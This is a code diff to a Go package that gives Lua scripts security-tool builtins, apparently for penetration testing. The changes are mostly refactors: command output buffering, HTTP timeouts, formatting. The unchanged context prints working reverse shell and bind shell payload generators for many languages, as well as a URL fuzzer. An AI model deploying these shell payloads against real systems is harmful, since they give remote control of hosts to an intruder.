@@ -2,6 +2,7 @@ package secengine
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/md5"
 	"crypto/sha1"
 	"crypto/sha256"
@@ -23,8 +24,10 @@ import (
 	"sync"
 	"time"
 
-	"github.com/yuin/gopher-lua"
+	lua "github.com/yuin/gopher-lua"
 )
+
+const defaultHTTPTimeout = 30 * time.Second
 
 // --- run(cmd) - Execute command, return output as string ---
 func builtinRun(L *lua.LState) int {
@@ -45,25 +48,31 @@ func builtinExec(L *lua.LState) int {
 	cmdStr := L.CheckString(1)
 
 	cmd := exec.Command("sh", "-c", cmdStr)
-	stdout, _ := cmd.StdoutPipe()
-	stderr, _ := cmd.StderrPipe()
+	var stdoutBuf bytes.Buffer
+	var stderrBuf bytes.Buffer
+	cmd.Stdout = &stdoutBuf
+	cmd.Stderr = &stderrBuf
 
-	err := cmd.Start()
-	if err != nil {
+	err := cmd.Run()
+	if err != nil && stderrBuf.Len() == 0 {
+		stderrBuf.WriteString(err.Error())
+	}
+
+	success := err == nil
+	if !success && cmd.ProcessState != nil {
+		success = cmd.ProcessState.Success()
+	}
+
+	if !success && err != nil && cmd.ProcessState == nil {
 		L.Push(lua.LBool(false))
 		L.Push(lua.LString(""))
 		L.Push(lua.LString(err.Error()))
 		return 3
 	}
 
-	stdoutBytes, _ := io.ReadAll(stdout)
-	stderrBytes, _ := io.ReadAll(stderr)
-	cmd.Wait()
-
-	success := cmd.ProcessState == nil || cmd.ProcessState.Success()
 	L.Push(lua.LBool(success))
-	L.Push(lua.LString(string(stdoutBytes)))
-	L.Push(lua.LString(string(stderrBytes)))
+	L.Push(lua.LString(stdoutBuf.String()))
+	L.Push(lua.LString(stderrBuf.String()))
 	return 3
 }
 
@@ -136,7 +145,7 @@ func builtinUnset(L *lua.LState) int {
 // --- read(file) - Read file contents ---
 func builtinRead(L *lua.LState) int {
 	filePath := L.CheckString(1)
-	
+
 	content, err := os.ReadFile(filePath)
 	if err != nil {
 		L.Push(lua.LBool(false))
@@ -152,7 +161,7 @@ func builtinRead(L *lua.LState) int {
 // --- write(file, data) - Write to file, data can be string or table ---
 func builtinWrite(L *lua.LState) int {
 	filePath := L.CheckString(1)
-	
+
 	var content string
 	switch v := L.Get(2).(type) {
 	case lua.LString:
@@ -219,7 +228,7 @@ func builtinFetch(L *lua.LState) int {
 		return 3
 	}
 
-	client := &http.Client{}
+	client := &http.Client{Timeout: defaultHTTPTimeout}
 	resp, err := client.Do(req)
 	if err != nil {
 		L.Push(lua.LBool(false))
@@ -961,15 +970,15 @@ func builtinColorPrint(L *lua.LState) int {
 	}
 
 	colorCodes := map[string]string{
-		"red":     "\033[31m",
-		"green":   "\033[32m",
-		"yellow":  "\033[33m",
-		"blue":    "\033[34m",
-		"purple":  "\033[35m",
-		"cyan":    "\033[36m",
-		"white":   "\033[37m",
-		"bold":    "\033[1m",
-		"reset":   "\033[0m",
+		"red":    "\033[31m",
+		"green":  "\033[32m",
+		"yellow": "\033[33m",
+		"blue":   "\033[34m",
+		"purple": "\033[35m",
+		"cyan":   "\033[36m",
+		"white":  "\033[37m",
+		"bold":   "\033[1m",
+		"reset":  "\033[0m",
 	}
 
 	code, exists := colorCodes[color]
@@ -1305,18 +1314,18 @@ func builtinGenReverseShell(L *lua.LState) int {
 	}
 
 	payloads := map[string]string{
-		"bash":           fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport),
-		"python":         fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", lhost, lport),
-		"python3":        fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", lhost, lport),
-		"php":            fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", lhost, lport),
-		"powershell":     fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", lhost, lport),
-		"perl":           fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", lhost, lport),
-		"ruby":           fmt.Sprintf("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", lhost, lport),
-		"nc":             fmt.Sprintf("nc -e /bin/sh %s %s", lhost, lport),
-		"nc_no_e":        fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport),
-		"java":           fmt.Sprintf("r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor();", lhost, lport),
-		"go":             fmt.Sprintf("package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%s:%s\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}", lhost, lport),
-		"lua":            fmt.Sprintf("lua -e 'require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"%s\",\"%s\");os.execute(\"/bin/sh -i <&3 >&3 2>&3\")'", lhost, lport),
+		"bash":       fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport),
+		"python":     fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", lhost, lport),
+		"python3":    fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", lhost, lport),
+		"php":        fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", lhost, lport),
+		"powershell": fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", lhost, lport),
+		"perl":       fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", lhost, lport),
+		"ruby":       fmt.Sprintf("ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", lhost, lport),
+		"nc":         fmt.Sprintf("nc -e /bin/sh %s %s", lhost, lport),
+		"nc_no_e":    fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport),
+		"java":       fmt.Sprintf("r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor();", lhost, lport),
+		"go":         fmt.Sprintf("package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%s:%s\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}", lhost, lport),
+		"lua":        fmt.Sprintf("lua -e 'require(\"socket\");require(\"os\");t=socket.tcp();t:connect(\"%s\",\"%s\");os.execute(\"/bin/sh -i <&3 >&3 2>&3\")'", lhost, lport),
 	}
 
 	payload, exists := payloads[payloadType]
@@ -1357,11 +1366,11 @@ func builtinGenBindShell(L *lua.LState) int {
 	}
 
 	payloads := map[string]string{
-		"nc":      fmt.Sprintf("nc -lvp %s -e /bin/sh", port),
-		"nc_noe":  fmt.Sprintf("mkfifo /tmp/s;nc -lvp %s < /tmp/s | /bin/sh > /tmp/s 2>&1;rm /tmp/s", port),
-		"python":  fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"\",%s));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", port),
-		"php":     fmt.Sprintf("php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"\",%s);socket_listen($s,1);$c=socket_accept($s);exec(\"/bin/sh -i\",0,$c);'", port),
-		"perl":    fmt.Sprintf("perl -MIO -e '$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");'", port),
+		"nc":     fmt.Sprintf("nc -lvp %s -e /bin/sh", port),
+		"nc_noe": fmt.Sprintf("mkfifo /tmp/s;nc -lvp %s < /tmp/s | /bin/sh > /tmp/s 2>&1;rm /tmp/s", port),
+		"python": fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"\",%s));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", port),
+		"php":    fmt.Sprintf("php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"\",%s);socket_listen($s,1);$c=socket_accept($s);exec(\"/bin/sh -i\",0,$c);'", port),
+		"perl":   fmt.Sprintf("perl -MIO -e '$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);accept(C,S);open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");'", port),
 	}
 
 	payload, exists := payloads[payloadType]
@@ -1494,7 +1503,12 @@ func builtinHttpRequest(L *lua.LState) int {
 	}
 	defer resp.Body.Close()
 
-	bodyBytes, _ := io.ReadAll(resp.Body)
+	bodyBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		L.Push(lua.LBool(false))
+		L.Push(lua.LString(err.Error()))
+		return 2
+	}
 
 	result := L.NewTable()
 	result.RawSetString("status", lua.LNumber(resp.StatusCode))
@@ -1532,12 +1546,20 @@ func builtinFuzz(L *lua.LState) int {
 
 	results := L.NewTable()
 	idx := 1
+	client := &http.Client{Timeout: defaultHTTPTimeout}
 
 	payloadsTbl.ForEach(func(key, payload lua.LValue) {
 		target := strings.ReplaceAll(template, "FUZZ", payload.String())
 
 		// Make HTTP request
-		resp, err := http.Get(target)
+		req, reqErr := http.NewRequest("GET", target, nil)
+		var resp *http.Response
+		var err error
+		if reqErr != nil {
+			err = reqErr
+		} else {
+			resp, err = client.Do(req)
+		}
 		statusCode := 0
 		bodyLen := 0
 		if err == nil {
